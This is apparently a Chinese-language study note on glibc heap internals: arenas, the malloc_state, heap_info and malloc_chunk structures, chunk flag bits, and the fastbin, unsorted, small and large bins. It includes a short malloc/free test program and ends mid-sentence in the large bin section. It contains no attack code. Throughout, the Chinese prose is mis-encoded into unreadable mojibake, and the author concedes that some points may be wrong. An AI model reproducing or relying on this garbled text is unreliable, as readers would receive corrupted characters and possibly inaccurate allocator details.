å†™è¿™ä¸ªä¸»è¦æ˜¯ä¸ºäº†è‡ªå·±èƒ½å¤Ÿå…¨é¢å¤ä¹ å †çš„åŸºç¡€çŸ¥è¯† ç”±äºæˆ‘æ²¡å­¦è¿‡æ“ä½œç³»ç»Ÿ æœ‰äº›ç›¸å…³çŸ¥è¯†å¯èƒ½ä¸å¤ªå¯¹ è¿˜è¯·æŒ‡æ­£ åŸºç¡€0x01 ä»€ä¹ˆæ˜¯å † åœ¨ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå †å¯ä»¥æä¾›åŠ¨æ€åˆ†é…çš„å†…å­˜ï¼Œå…è®¸ç¨‹åºç”³è¯·å¤§å°æœªçŸ¥çš„å†…å­˜ å †å…¶å®å°±æ˜¯ç¨‹åºè™šæ‹Ÿåœ°å€ç©ºé—´çš„ä¸€å—è¿ç»­çš„çº¿æ€§åŒºåŸŸï¼Œå®ƒç”±ä½åœ°å€å‘é«˜åœ°å€æ–¹å‘å¢é•¿ æˆ‘ä»¬ä¸€èˆ¬æˆç®¡ç†å †çš„é‚£éƒ¨åˆ†ç¨‹åºä¸ºå †ç®¡ç†å™¨ å †ç®¡ç†å™¨å¤„äºç”¨æˆ·ç¨‹åºä¸å†…æ ¸ä¸­é—´ï¼Œä¸»è¦åšä»¥ä¸‹å·¥ä½œ malloc free 0x02 å¦‚ä½•åˆ†é…å †å’Œé‡Šæ”¾å †1.mallocå‡½æ•°1void *malloc(size_t n); è¯¥å‡½æ•°è¿”å›å¯¹åº”å¤§å°å­—èŠ‚çš„å†…å­˜å—çš„æŒ‡é’ˆ æ­¤å¤–ï¼Œè¯¥å‡½æ•°è¿˜å¯¹ä¸€äº›å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†å¤„ç† å½“n=0æ—¶ï¼Œè¿”å›å½“å‰ç³»ç»Ÿå…è®¸çš„å †çš„æœ€å°å†…å­˜å— å½“nä¸ºè´Ÿæ•°æ—¶ï¼Œç”±äºåœ¨å¤§å¤šæ•°ç³»ç»Ÿä¸­ï¼Œsize_tæ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥ç¨‹åºå°±ä¼šç”³è¯·å¾ˆå¤§çš„å†…å­˜ç©ºé—´ï¼Œä½†é€šå¸¸æ¥è¯´éƒ½ä¼šå¤±è´¥ï¼Œå› ä¸ºç³»ç»Ÿæ²¡æœ‰é‚£ä¹ˆå¤šçš„å†…å­˜å¯ä»¥åˆ†é… 2.freeå‡½æ•°1void free(void *p); è¯¥å‡½æ•°ä¼šé‡Šæ”¾ç”±pæ‰€æŒ‡å‘çš„å†…å­˜å—ã€‚è¿™ä¸ªå†…å­˜å—æœ‰å¯èƒ½æ˜¯é€šè¿‡mallocå‡½æ•°å¾—åˆ°çš„ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯é€šè¿‡ç›¸å…³çš„å‡½æ•°reallocå¾—åˆ°çš„ è¯¥å‡½æ•°è¿˜å¯¹å¼‚å¸¸æƒ…å†µè¿›è¡Œäº†ä¸€ä¸‹å¤„ç† å½“pä¸ºç©ºæŒ‡é’ˆæ—¶ï¼Œå‡½æ•°ä¸æ‰§è¡Œä»»ä½•æ“ä½œ å½“på·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œå†æ¬¡é‡Šæ”¾ä¼šå‡ºç°é”™è¯¯çš„æ•ˆæœï¼Œè¿™å…¶å®å°±æ˜¯double free é™¤äº†è¢«ç¦ç”¨ï¼ˆmallocptï¼‰çš„æƒ…å†µä¸‹ï¼Œå½“é‡Šæ”¾å¾ˆå¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šå°†è¿™äº›å†…å­˜ç©ºé—´è¿˜ç»™ç³»ç»Ÿï¼Œä»¥ä¾¿å‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´ 0x03 å¦‚ä½•å®ç°å † å †çš„glibcå®ç°ä¸»è¦åŒ…æ‹¬struct _heap_infoï¼Œstruct malloc_stateï¼Œstruct malloc_chunkè¿™3ä¸ªç»“æ„ä½“ 1.Arena ä¸€ä¸ªçº¿ç¨‹åªæœ‰ä¸€ä¸ªarneaï¼Œå¹¶ä¸”è¿™äº›çº¿ç¨‹çš„arneaéƒ½æ˜¯ç‹¬ç«‹çš„ä¸æ˜¯ç›¸åŒçš„ ä¸»çº¿ç¨‹çš„arneaç§°ä¸ºâ€œmain_arenaâ€ã€‚å­çº¿ç¨‹çš„arneaç§°ä¸ºâ€œthread_arenaâ€ Arenaçš„æ•°é‡åŠç®¡ç†æˆ‘ä»¬è¯´åˆ°æœ‰ä¸»çº¿ç¨‹å’Œå­çº¿ç¨‹çš„arena é‚£ä¹ˆæ¯ä¸ªç¨‹åºçš„arenaçš„æ•°é‡åº”è¯¥å°±æ˜¯æœ‰é™çš„ 123432ä½ç³»ç»Ÿä¸­ï¼š Number of arena = 2 * number of cores + 1.64ä½ç³»ç»Ÿä¸­ï¼š Number of arena = 8 * number of cores + 1 è¿™é‡Œå°±ä¼šæ¶‰åŠä¸€ä¸ªå¤šçº¿ç¨‹å…±äº«é—®é¢˜ egï¼šä¸€ä¸ªä¸»Arena ä¸¤ä¸ªå‰¯Arena å¦‚æœæœ‰ä¸€ä¸ª4çº¿ç¨‹ï¼ˆå¤§äº3ä¸ªArenaï¼‰çš„ç¨‹åºï¼Œæ˜¾ç„¶è¿™é‡Œå°±ä¼šå‡ºç°ä¸€ä¸ªå…±äº«é—®é¢˜ æ­¤æ—¶glibc mallocä¼šåšä»¥ä¸‹æ“ä½œï¼š é¦–å…ˆï¼Œglibc mallocå¾ªç¯éå†æ‰€æœ‰å¯ç”¨çš„ç«æŠ€åœºï¼Œåœ¨éå†çš„è¿‡ç¨‹ä¸­ï¼Œå®ƒä¼šå°è¯•é”è¯¥ç«æŠ€åœºã€‚å¦‚æœæˆåŠŸé”ï¼ˆè¯¥ç«æŠ€åœºå½“å‰å¯¹åº”çš„çº¿ç¨‹å¹¶æœªä½¿ç”¨å †å†…å­˜åˆ™è¡¨ç¤ºå¯é”ï¼‰ï¼Œé‚£ä¹ˆè¯¥ç«æŠ€åœºå°±å¯ä»¥è¢«çº¿ç¨‹3æ‰€ä½¿ç”¨ è€Œå¦‚æœæ²¡èƒ½æ‰¾åˆ°å¯ç”¨çš„èˆå°ä¸Šï¼Œé‚£ä¹ˆå°±å°†çº¿ç¨‹3çš„mallocçš„æ“ä½œé˜»å¡ï¼Œç›´åˆ°æœ‰å¯ç”¨çš„èˆå°ä¸ºæ­¢ å½“çº¿ç¨‹3çš„mallocé˜»å¡è§£é™¤æ—¶ï¼Œglibc mallocå°±ä¼šå…ˆå°è¯•ä½¿ç”¨æœ€è¿‘è®¿é—®çš„ç«æŠ€åœºï¼ˆæ­¤æ—¶ä¸ºä¸»ç«æŠ€åœºï¼‰ã€‚å¦‚æœæ­¤æ—¶ä¸»ç«æŠ€åœºå¯ç”¨çš„è¯ï¼Œå°±ç›´æ¥ä½¿ç”¨ï¼Œå¦åˆ™å°±å°†çº¿ç¨‹3å†æ¬¡é˜»å¡ï¼Œç›´åˆ°ä¸»èˆå°ä¸Šå†æ¬¡å¯ç”¨ä¸ºæ­¢ 2.malloc_state glibcçš„ä¸­arneaå°±æ˜¯ç”¨è¿™ä¸ªç»“æ„ä½“è¡¨ç¤ºçš„ å…¶ä¸­åŒ…å«å¾ˆå¤šçš„ä¿¡æ¯ï¼šå„ç§binsçš„ä¿¡æ¯ï¼Œtop chunkä»¥åŠæœ€åä¸€ä¸ªå‰©ä½™chunkç­‰ 12345678910111213141516171819202122232425262728293031323334353637383940414243struct malloc_state&#123; /* Serialize access. */ __libc_lock_define (, mutex); /* Flags (formerly in max_fast). */ int flags; /* Set if the fastbin chunks contain recently inserted free blocks. */ /* Note this is a bool but not all targets support atomics on booleans. */ int have_fastchunks; /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Base of the topmost chunk -- not otherwise kept in a bin */ mchunkptr top; /* The remainder from the most recent split of a small request */ mchunkptr last_remainder; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; /* Bitmap of bins */ unsigned int binmap[BINMAPSIZE]; /* Linked list */ struct malloc_state *next; /* Linked list for free arenas. Access to this field is serialized by free_list_lock in arena.c. */ struct malloc_state *next_free; /* Number of threads attached to this arena. 0 if the arena is on the free list. Access to this field is serialized by free_list_lock in arena.c. */ INTERNAL_SIZE_T attached_threads; /* Memory allocated from the system in this arena. */ INTERNAL_SIZE_T system_mem; INTERNAL_SIZE_T max_system_mem;&#125;; fastbinsYæ•°ç»„ï¼šå­˜å‚¨çš„æ˜¯è¯¥é¢†åŸŸç®¡ç†çš„fastbins binsæ•°ç»„ï¼šå­˜å‚¨çš„æ˜¯è¯¥é¢†åŸŸç®¡ç†çš„smallbinsï¼Œunsortedbinï¼Œlargebin binmapå˜é‡ï¼šç³»ç»ŸæŸ¥çœ‹æœ‰å“ªäº›åƒåœ¾ç®±é“¾ä¸­æœ‰å—æ—¶ï¼Œä¸å¯èƒ½å»fastbinsYå’Œç®±æ•°ç»„ä¸€ä¸ªä¸€ä¸ªçš„éå†é€šè¿‡binmapå˜é‡ï¼Œé‡‡ç”¨äºŒè¿›åˆ¶å­˜å‚¨ï¼Œå°†äºŒè¿›åˆ¶ä½ä¸æ•°ç»„çš„ç´¢å¼•ç›¸å¯¹ï¼Œç³»ç»ŸæŸ¥æ‰¾ç®±é“¾æ—¶å¯ä»¥ã€‚é€šè¿‡æŒ‰ä½ä¸æ¥æŸ¥è¯¢ï¼Œè¿™æ ·æ›´é«˜æ•ˆã€‚è™½ç„¶unsigned intçš„äºŒè¿›åˆ¶ä½æ¯”æ•°ç»„æ€»å…ƒç´ å°‘ï¼Œä½†æ˜¯ç³»ç»Ÿä¸ä¼šæœ‰é‚£ä¹ˆå¤šçš„biné“¾ï¼Œä¸éœ€è¦è€ƒè™‘è¿™ä¸ªé—®é¢˜ 3.heap_info æˆ‘ä»¬çŸ¥é“ä¸€ä¸ªçº¿ç¨‹å¯ä»¥åŒ…å«å¤šä¸ªå †æ®µï¼Œè¿™äº›å †æ®µåŒå±äºä¸€ä¸ªèˆå°æ¥ç®¡ç†ã€‚æ¯ä¸ªå †æ®µçš„ä¿¡æ¯å°±æ˜¯ç”¨è¿™ä¸ªç»“æ„ä½“æ¥è¡¨ç¤ºçš„ æ³¨æ„ï¼šè¿™ä¸ªä¸æ˜¯å­˜å‚¨å †å—çš„æ•°æ®ï¼Œè€Œæ˜¯æ¥è§£é‡Šè¯´æ˜è¿™ä¸ªå †æ®µçš„ 123456789101112typedef struct _heap_info&#123; mstate ar_ptr; /* Arena for this heap. */ struct _heap_info *prev; /* Previous heap. */ size_t size; /* Current size in bytes. */ size_t mprotect_size; /* Size in bytes that has been mprotected PROT_READ|PROT_WRITE. */ /* Make sure the following data is properly aligned, particularly that sizeof (heap_info) + 2 * SIZE_SZ is a multiple of MALLOC_ALIGNMENT. */ char pad[-6 * SIZE_SZ &amp; MALLOC_ALIGN_MASK];&#125; heap_info; ar_ptrï¼šæ­¤å †æ®µå½’å±äºå“ªä¸€ä¸ªarneaç®¡ç† prevï¼šå‰ä¸€ä¸ªå †æ®µ 4.malloc_chunk ä¸€ä¸ªå †å—è¢«åˆ†ä¸ºå¤šä¸ªå—ï¼Œè¿™äº›å—å°±æ˜¯ç”¨è¿™äº›ç»“æ„ä½“è¡¨ç¤ºçš„ï¼Œè¿™ä¸ªæ‰æ˜¯æˆ‘ä»¬åœ¨glibcçš„æ­£çœŸå­˜å‚¨å †æ•°æ®ä¿¡æ¯çš„ç»“æ„ä½“ 12345678910111213struct malloc_chunk &#123; INTERNAL_SIZE_T mchunk_prev_size; /* Size of previous chunk (if free).*/ INTERNAL_SIZE_T mchunk_size; /* Size in bytes, including overhead.*/ struct malloc_chunk* fd; /* double links -- used only if free. */ struct malloc_chunk* bk; /* Only used for large blocks: pointer to next larger size. */ struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */ struct malloc_chunk* bk_nextsize; &#125;; æ¯ä¸ªæˆå‘˜éƒ½æ˜¯8å­—èŠ‚ï¼ˆ64ä½ç³»ç»Ÿä¸­ï¼‰ï¼Œ4å­—èŠ‚ï¼ˆ32ä½ç³»ç»Ÿä¸­ï¼‰ mchunk_prev_sizeï¼šåªæœ‰å½“è¯¥chunkçš„ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€chunkæ˜¯ç©ºé—²çš„è¯ï¼Œè¯¥å­—æ®µåœ¨æœ¬chunkä¸­æ‰æœ‰ç”¨ï¼Œç”¨æ¥è®°å½•å‰ä¸€ä¸ªchunk çš„å¤§å° (åŒ…æ‹¬chunkå¤´)ã€‚å¦åˆ™ï¼Œè¯¥å­—æ®µä¸º0æ˜¯æ²¡æœ‰ç”¨çš„ï¼›ä½†æ˜¯å½“å‰ä¸€ä¸ªchunkç”³è¯·çš„å¤§å°å¤§äºå‰ä¸€ä¸ªchunkçš„å¤§å°æ—¶ï¼Œé‚£ä¹ˆè¯¥å­—æ®µå¯ä»¥ç”¨æ¥ç»™å‰ä¸€ä¸ªchunkä½¿ç”¨ï¼ˆè¿™å°±æ˜¯chunkçš„ç©ºé—´å¤ç”¨ï¼Œåé¢æ–‡ç« ä»‹ç»ï¼‰ mchunk_sizeï¼šå½“å‰chunkçš„å¤§å°ï¼Œchunkå¤§å°éƒ½æ˜¯8å­—èŠ‚å¯¹é½ è¿™é‡Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹gdbè°ƒè¯•çš„ç•Œé¢ æºç å¦‚ä¸‹ 12345678910111213141516#include &lt;stdlib.h&gt;#include &lt;malloc.h&gt;#include &lt;string.h&gt;int main()&#123; char *p; p = malloc(10); char *H; H = malloc(64); memcpy(H,\"aaaaaaaaaaaaaaaa\",16); free(H); return 0;&#125;gcc -o a.out a.c#64ä½gcc -m32 -o b.out b.c#32ä½ 64ä½ 32ä½ å½“å‰chunkå¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼š fdï¼šä»fdå­—æ®µå¼€å§‹çš„æ˜¯ç”¨æˆ·çš„æ•°æ® å½“å‰chunkå¤„äºç©ºé—²æ—¶ï¼š å› ä¸ºchunkå¤„äºç©ºé—²æ—¶ï¼Œä¼šè¢«æ”¾åˆ°biné“¾ä¸­ï¼Œæ‰€ä»¥fdå’Œbkç”¨äºæŒ‡å‘è‡ªå·±æ‰€åœ¨biné“¾ä¸­å‰åçš„ç©ºé—²chunk fdï¼šæŒ‡å‘å‰ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunkçš„æŒ‡é’ˆï¼ˆå¤´æŒ‡é’ˆï¼‰ bkï¼šæŒ‡å‘åä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ chunkçš„æŒ‡é’ˆ é€šè¿‡fdå’Œbkå¯ä»¥å°†ç©ºé—²çš„chunkå—åŠ å…¥åˆ°ç©ºé—²çš„chunkå—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç† fd_nextsizeã€bk_nextsize ä¹Ÿæ˜¯åªæœ‰chunkç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„chunkï¼ˆlarge chunkï¼‰ fd_nextsizeï¼šæŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å«binçš„å¤´æŒ‡é’ˆ bk_nextsizeï¼šæŒ‡å‘åä¸€ä¸ªä¸å½“å‰ chunk å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« bin çš„å¤´æŒ‡é’ˆ ä¸€èˆ¬ç©ºé—²çš„ large chunk åœ¨ fd çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå† malloc_chunkçš„å†…å­˜åˆ†é…å¤§å°æœ€å°çš„ç©ºé—´ï¼šmchunk_prev_sizeå­—æ®µ + mchunk_sizeå­—æ®µ + fdå­—æ®µ + bkå­—æ®µ æ‰€éœ€è¦çš„ç©ºé—´ã€‚æ‰€ä»¥64ä½ç³»ç»Ÿæœ€ä½éœ€è¦ 4 * SIZE_SZ = 32å­—èŠ‚ï¼›32ä½ç³»ç»Ÿæ˜¯16å­—èŠ‚ å®é™…ç©ºé—´ï¼šmallocå¤§å° + chunkå¯¹é½è§„åˆ™ + mchunk_prev_sizeå­—æ®µ + mchunk_sizeå­—æ®µ + ä¸‹ä¸€ä¸ªchunkçš„mchunk_prev_sizeæˆå‘˜ç©ºé—´ chunkçš„æ•°æ®ç»“æ„å¤§å°çš„å›¾ï¼ˆ64ä½ç³»ç»Ÿï¼‰ mchunk_sizeçš„æ ‡è®°ä½çš„å¤ç”¨mchunk_sizeåœ¨64ä½ç³»ç»Ÿä¸‹æ˜¯8ä¸ªå­—èŠ‚ï¼Œå­—æ®µçš„æœ€åä¸‰ä¸ªbitä½ï¼Œå¤ç”¨ç”¨ä½œäº†ï¼ˆAMPï¼‰çš„æ ‡è®°ä½ç½®ã€‚åä¸‰ä½bitä½çš„å¤ç”¨ï¼Œä¸ä¼šå½±å“sizeçš„æ•°æ®å¤§å° Aï¼šA=0 ä¸ºä¸»åˆ†åŒºåˆ†é…ï¼ŒA=1 ä¸ºéä¸»åˆ†åŒºåˆ†é…ï¼Œå‚è§åé¢ Mï¼šM=1è¡¨ç¤ºä½¿ç”¨mmapæ˜ å°„åŒºåŸŸï¼ŒM=0ä¸ºä½¿ç”¨heapåŒºåŸŸ Pï¼šP=0 è¡¨ç¤ºpre_chunkç©ºé—²ï¼Œmchunk_prev_sizeæ‰æœ‰æ•ˆ 0x04 chunkçš„åˆ†ç±»1.allocated chunkå½“å‰chunkæ˜¯è¢«åº”ç”¨å±‚ç”¨æˆ·æ‰€ä½¿ç”¨çš„ 2.free chunkå½“å‰chunkæ˜¯ç©ºé—²çš„ï¼Œæ²¡æœ‰è¢«åº”ç”¨å±‚ç”¨æˆ·æ‰€ä½¿ç”¨ 3.top chunk æ¦‚å¿µï¼šå½“ä¸€ä¸ªchunkå¤„äºä¸€ä¸ªarenaçš„æœ€é¡¶éƒ¨(å³æœ€é«˜å†…å­˜åœ°å€å¤„)çš„æ—¶å€™ï¼Œå°±ç§°ä¹‹ä¸ºtop chunk ä½œç”¨ï¼šè¯¥chunkå¹¶ä¸å±äºä»»ä½•binï¼Œè€Œæ˜¯åœ¨ç³»ç»Ÿå½“å‰çš„æ‰€æœ‰free chunk(æ— è®ºé‚£ç§bin)éƒ½æ— æ³•æ»¡è¶³ç”¨æˆ·è¯·æ±‚çš„å†…å­˜å¤§å°çš„æ—¶å€™ï¼Œå°†æ­¤chunkå½“åšä¸€ä¸ªåº”æ€¥æ¶ˆé˜²å‘˜ï¼Œåˆ†é…ç»™ç”¨æˆ·ä½¿ç”¨ åˆ†é…çš„è§„åˆ™ï¼šå¦‚æœtop chunkçš„å¤§å°æ¯”ç”¨æˆ·è¯·æ±‚çš„å¤§å°è¦å¤§çš„è¯ï¼Œå°±å°†è¯¥top chunkåˆ†ä½œä¸¤éƒ¨åˆ†ï¼š1ï¼‰ç”¨æˆ·è¯·æ±‚çš„chunkï¼›2ï¼‰å‰©ä½™çš„éƒ¨åˆ†æˆä¸ºæ–°çš„top chunkã€‚å¦åˆ™ï¼Œå°±éœ€è¦æ‰©å±•heapæˆ–åˆ†é…æ–°çš„heapäº†â€”â€”åœ¨main arenaä¸­é€šè¿‡sbrkæ‰©å±•heapï¼Œè€Œåœ¨thread arenaä¸­é€šè¿‡mmapåˆ†é…æ–°çš„heap 4.last remainder chunk å®ƒæ˜¯æ€ä¹ˆäº§ç”Ÿçš„ï¼šå½“ç”¨æˆ·è¯·æ±‚çš„æ˜¯ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binã€unsorted binæ»¡è¶³çš„æ—¶å€™ï¼Œå°±é€šè¿‡binmapséå†binæŸ¥æ‰¾æœ€åˆé€‚çš„chunkï¼Œå¦‚æœè¯¥chunkæœ‰å‰©ä½™éƒ¨åˆ†çš„è¯ï¼Œå°±å°†è¯¥å‰©ä½™éƒ¨åˆ†å˜æˆä¸€ä¸ªæ–°çš„chunkåŠ å…¥åˆ°unsorted binä¸­ï¼Œå¦å¤–ï¼Œå†å°†è¯¥æ–°çš„chunkå˜æˆæ–°çš„last remainder chunk å®ƒçš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼šæ­¤ç±»å‹çš„chunkç”¨äºæé«˜è¿ç»­malloc(small chunk)çš„æ•ˆç‡ï¼Œä¸»è¦æ˜¯æé«˜å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§ã€‚é‚£ä¹ˆå…·ä½“æ˜¯æ€ä¹ˆæé«˜å±€éƒ¨æ€§çš„å‘¢ï¼Ÿä¸¾ä¾‹è¯´æ˜ã€‚å½“ç”¨æˆ·è¯·æ±‚ä¸€ä¸ªsmall chunkï¼Œä¸”è¯¥è¯·æ±‚æ— æ³•è¢«small binæ»¡è¶³ï¼Œé‚£ä¹ˆå°±è½¬è€Œäº¤ç”±unsorted binå¤„ç†ã€‚åŒæ—¶ï¼Œå‡è®¾å½“å‰unsorted binä¸­åªæœ‰ä¸€ä¸ªchunkçš„è¯â€”â€”å°±æ˜¯last remainder chunkï¼Œé‚£ä¹ˆå°±å°†è¯¥chunkåˆ†æˆä¸¤éƒ¨åˆ†ï¼šå‰è€…åˆ†é…ç»™ç”¨æˆ·ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†æ”¾åˆ°unsorted binä¸­ï¼Œå¹¶æˆä¸ºæ–°çš„last remainder chunkã€‚è¿™æ ·å°±ä¿è¯äº†è¿ç»­malloc(small chunk)ä¸­ï¼Œå„ä¸ªsmall chunkåœ¨å†…å­˜åˆ†å¸ƒä¸­æ˜¯ç›¸é‚»çš„ï¼Œå³æé«˜äº†å†…å­˜åˆ†é…çš„å±€éƒ¨æ€§ 0x05 binsåˆ†ç±» binæ˜¯ä¸€ä¸ªç”±struct chunkç»“æ„ä½“ç»„æˆçš„é“¾è¡¨ å‰é¢ä»‹ç»è¿‡ï¼Œä¸åŒçš„chunkæ ¹æ®ç‰¹ç‚¹ä¸åŒåˆ†ä¸ºä¸åŒçš„chunkï¼Œä¸ºäº†å°†è¿™äº›chunkè¿›è¡Œåˆ†ç±»çš„ç®¡ç†ï¼Œglibcé‡‡ç”¨äº†biné“¾è¿™ç§æ–¹å¼ç®¡ç†ä¸åŒçš„chunk ä¸åŒçš„biné“¾æ˜¯ç”±arenaç®¡ç†çš„ biné“¾ä¸­çš„chunkå‡ä¸ºfree chunk 1.binçš„malloc_state1234567891011121314151617181920typedef struct malloc_chunk* mchunkptr;typedef struct malloc_chunk *mfastbinptr; struct malloc_state&#123; ... /*other member*/ ... /* Fastbins */ mfastbinptr fastbinsY[NFASTBINS]; /* Normal bins packed as described above */ mchunkptr bins[NBINS * 2 - 2]; ... /*other member*/ ...&#125;; fastbinYæ•°ç»„ï¼šå¤§å°ä¸º10ã€‚è®°å½•çš„æ˜¯fast biné“¾ binsæ•°ç»„ï¼šå¤§å°ä¸º129ã€‚è®°å½•çš„æ˜¯unsorted binï¼ˆ1ï¼‰ã€small binï¼ˆ2~63ï¼‰ã€large biné“¾ï¼ˆ64~126ï¼‰ 2.fastbinæ¦‚å¿µï¼šchunkçš„å¤§å°åœ¨32å­—èŠ‚åˆ°128å­—èŠ‚ï¼ˆ0x20~0x80ï¼‰çš„chunkç§°ä¸ºâ€œfast chunkï¼ˆå¤§å°ä¸æ˜¯mallocæ—¶çš„å¤§å°ï¼Œè€Œæ˜¯åœ¨å†…å­˜ä¸­struct malloc_chunkçš„å¤§å°ï¼ŒåŒ…å«å‰2ä¸ªæˆå‘˜ï¼‰ fast biné“¾è¡¨çš„ä¸ªæ•°ä¸º10ä¸ª ä¸ä¼šå¯¹free chunkè¿›è¡Œåˆå¹¶ï¼šé‰´äºè®¾è®¡fast binçš„åˆè¡·å°±æ˜¯è¿›è¡Œå¿«é€Ÿçš„å°å†…å­˜åˆ†é…å’Œé‡Šæ”¾ï¼Œå› æ­¤ç³»ç»Ÿå°†å±äºfast binçš„chunkçš„PREV_INUSEä½æ€»æ˜¯è®¾ç½®ä¸º1ï¼Œè¿™æ ·å³ä½¿å½“fast binä¸­æœ‰æŸä¸ªchunkåŒä¸€ä¸ªfree chunkç›¸é‚»çš„æ—¶å€™ï¼Œç³»ç»Ÿä¹Ÿä¸ä¼šè¿›è¡Œè‡ªåŠ¨åˆå¹¶æ“ä½œï¼Œè€Œæ˜¯ä¿ç•™ä¸¤è€…ã€‚è™½ç„¶è¿™æ ·åšå¯èƒ½ä¼šé€ æˆé¢å¤–çš„ç¢ç‰‡åŒ–é—®é¢˜ï¼Œä½†ç‘•ä¸æ©ç‘œ LIFO fastbinsYæ•°ç»„å­˜å‚¨fastbinsçš„è§„åˆ™ï¼š æ¯ä¸ªfast biné“¾è¡¨éƒ½æ˜¯å•é“¾è¡¨ï¼ˆä½¿ç”¨fdæŒ‡é’ˆï¼‰ã€‚å› æ­¤ï¼Œfast binä¸­æ— è®ºæ˜¯æ·»åŠ è¿˜æ˜¯ç§»é™¤fast chunkï¼Œéƒ½æ˜¯å¯¹â€œé“¾è¡¨å°¾â€è¿›è¡Œæ“ä½œï¼Œè€Œä¸ä¼šå¯¹æŸä¸ªä¸­é—´çš„fast chunkè¿›è¡Œæ“ä½œ å•ä¸ªfastbiné“¾è¡¨ä¸­çš„chunkå¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ªfastbiné“¾è¡¨ä¸­çš„chunkå¤§å°æ˜¯ä¸åŒçš„ 3.unsorted binå½“é‡Šæ”¾è¾ƒå°æˆ–è¾ƒå¤§çš„chunkçš„æ—¶å€™ï¼Œå¦‚æœç³»ç»Ÿæ²¡æœ‰å°†å®ƒä»¬æ·»åŠ åˆ°å¯¹åº”çš„binsä¸­ï¼Œç³»ç»Ÿå°±å°†è¿™äº›chunkæ·»åŠ åˆ°unsorted binä¸­ã€‚åœ¨å †ç®¡ç†å™¨çš„unsorted bin ä¸ä¸ºç©ºæ—¶ï¼Œç”¨æˆ·ç”³è¯·éfast binå¤§å°çš„å†…å­˜ä¼šå…ˆä»unsorted binä¸­æŸ¥æ‰¾ï¼Œå¦‚æœæ‰¾åˆ°ç¬¦åˆè¯¥ç”³è¯·å¤§å°è¦æ±‚çš„chunkï¼Œåˆ™ç›´æ¥åˆ†é…æˆ–åˆ†å‰²è¯¥chunkã€‚ unsorted binçš„ä¸ªæ•°ï¼š 1ä¸ª unsorted binæ˜¯ä¸€ä¸ªç”±free chunksç»„æˆçš„å¾ªç¯åŒé“¾è¡¨ åœ¨unsorted binä¸­ï¼Œå¯¹chunkçš„å¤§å°å¹¶æ²¡æœ‰é™åˆ¶ï¼Œä»»ä½•å¤§å°çš„chunkéƒ½å¯ä»¥å½’å±åˆ°unsorted binä¸­ unsortedbiné‡‡ç”¨çš„éå†é¡ºåºæ˜¯FIFO 4.small binæ¦‚å¿µï¼šå°äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunkç§°ä¹‹ä¸ºsmall chunkï¼Œsmall binå°±æ˜¯ç”¨äºç®¡ç†small chunkçš„ small biné“¾è¡¨çš„ä¸ªæ•°ä¸º62ä¸ª FIFO å¾ªç¯åŒå‘é“¾è¡¨ï¼Œå°±å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾é€Ÿåº¦è€Œè¨€ï¼Œsmall binæ¯”larger binå¿«ï¼Œä½†æ¯”fast binæ…¢ Small biné“¾è¡¨ æ¯ä¸ªsmallbinä¹Ÿæ˜¯ä¸€ä¸ªç”±å¯¹åº”free chunkç»„æˆçš„å¾ªç¯åŒé“¾è¡¨ small biné‡‡ç”¨FIFO(å…ˆå…¥å…ˆå‡º)ç®—æ³•ï¼šå†…å­˜é‡Šæ”¾æ“ä½œå°±å°†æ–°é‡Šæ”¾çš„chunkæ·»åŠ åˆ°é“¾è¡¨çš„front end(å‰ç«¯)ï¼Œåˆ†é…æ“ä½œå°±ä»é“¾è¡¨çš„rear end(å°¾ç«¯)ä¸­è·å–chunk å•ä¸ªsmallbiné“¾è¡¨ä¸­çš„chunkå¤§å°éƒ½æ˜¯ç›¸åŒçš„ï¼Œå„ä¸ªsmallbiné“¾è¡¨ä¸­çš„chunkå¤§å°æ˜¯ä¸åŒçš„ï¼Œè·ŸfastbinsYæ•°ç»„å­˜å‚¨fastbiné“¾çš„åŸç†æ˜¯ç›¸åŒçš„ 5.large binæ¦‚å¿µï¼šå¤§äºç­‰äº1024å­—èŠ‚ï¼ˆ0x400ï¼‰çš„chunkç§°ä¹‹ä¸ºlarge chunkï¼Œlarge binå°±æ˜¯ç”¨äºç®¡ç†è¿™äº›largechunkçš„ large biné“¾è¡¨çš„ä¸ªæ•°ä¸º63ä¸ªï¼Œè¢«åˆ†ä¸º6ç»„ largechunkä½¿ç”¨fd_nextsizeã€bk_nextsizeè¿æ¥èµ·æ¥çš„ Large Biné“¾è¡¨ åŒä¸€ä¸ªlargebinä¸­æ¯ä¸ªchunkçš„å¤§å°å¯ä»¥ä¸ä¸€æ ·ï¼Œè¿™äº›chunkæ 